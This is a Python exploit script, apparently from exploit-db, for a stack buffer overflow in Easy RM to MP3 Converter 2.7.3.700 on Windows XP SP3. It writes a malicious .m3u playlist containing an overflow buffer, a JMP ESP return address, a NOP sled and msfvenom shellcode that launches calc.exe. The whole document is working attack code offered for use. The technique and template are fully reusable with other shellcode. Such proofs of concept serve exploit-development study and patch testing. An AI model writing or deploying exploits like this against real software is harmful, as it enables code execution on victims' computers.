#!/usr/share/python
#-----------------------------------------------------------------------------------------------------------#
# Software      = Easy RM to MP3 Converter v2.7.3.700                                                       #
# Download Link = https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe #
# Date          = 9/1/2017                                                                                  #
# Reference     = https://www.exploit-db.com/exploits/10374/                                                #
# Author        = @ihack4falafel                                                                            #
# Tested on     = Windows XP SP3 - Professional                                                             #
# EIP Offset    = 26064                                                                                     #
# Badchars      = "\x00\x09\x0A"                                                                            #
# RET Address   = 0x7e429353 | "\xFF\xE4" | [USER32.dll]                                                    #
# Usage         = Easy RM to MP3 Converter > Load > Evil_File.m3u                                           #        
#-----------------------------------------------------------------------------------------------------------#

import struct
import time
import socket

#------------------------------------------------------------------------------#
# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x09\x0A" -f python -v payload #
#------------------------------------------------------------------------------#

payload =  ""
payload += "\xdd\xc6\xd9\x74\x24\xf4\x5b\xbf\xd5\xc2\x64\xc2"
payload += "\x2b\xc9\xb1\x31\x83\xeb\xfc\x31\x7b\x14\x03\x7b"
payload += "\xc1\x20\x91\x3e\x01\x26\x5a\xbf\xd1\x47\xd2\x5a"
payload += "\xe0\x47\x80\x2f\x52\x78\xc2\x62\x5e\xf3\x86\x96"
payload += "\xd5\x71\x0f\x98\x5e\x3f\x69\x97\x5f\x6c\x49\xb6"
payload += "\xe3\x6f\x9e\x18\xda\xbf\xd3\x59\x1b\xdd\x1e\x0b"
payload += "\xf4\xa9\x8d\xbc\x71\xe7\x0d\x36\xc9\xe9\x15\xab"
payload += "\x99\x08\x37\x7a\x92\x52\x97\x7c\x77\xef\x9e\x66"
payload += "\x94\xca\x69\x1c\x6e\xa0\x6b\xf4\xbf\x49\xc7\x39"
payload += "\x70\xb8\x19\x7d\xb6\x23\x6c\x77\xc5\xde\x77\x4c"
payload += "\xb4\x04\xfd\x57\x1e\xce\xa5\xb3\x9f\x03\x33\x37"
payload += "\x93\xe8\x37\x1f\xb7\xef\x94\x2b\xc3\x64\x1b\xfc"
payload += "\x42\x3e\x38\xd8\x0f\xe4\x21\x79\xf5\x4b\x5d\x99"
payload += "\x56\x33\xfb\xd1\x7a\x20\x76\xb8\x10\xb7\x04\xc6"
payload += "\x56\xb7\x16\xc9\xc6\xd0\x27\x42\x89\xa7\xb7\x81"
payload += "\xee\x58\xf2\x88\x46\xf1\x5b\x59\xdb\x9c\x5b\xb7"
payload += "\x1f\x99\xdf\x32\xdf\x5e\xff\x36\xda\x1b\x47\xaa"
payload += "\x96\x34\x22\xcc\x05\x34\x67\xaf\xc8\xa6\xeb\x1e"
payload += "\x6f\x4f\x89\x5e"

#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = AAA...........AAA #
# buffer = EIP - RET Address #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#

buffer =  "A" * 26064
buffer += struct.pack('<L', 0x7e429353)
buffer += "\x90" * 40
buffer += payload
buffer += "B" * (30000-26064-4-40-len(payload))

try:
  f=open("Evil_File.m3u","w")
  print "[+] Creating %s bytes evil payload.." %len(buffer)
  time.sleep(5)
  f.write(buffer)
  f.close()
  print "[+] File created! Go ahead and load that file."
except:
  print "File cannot be created"
    
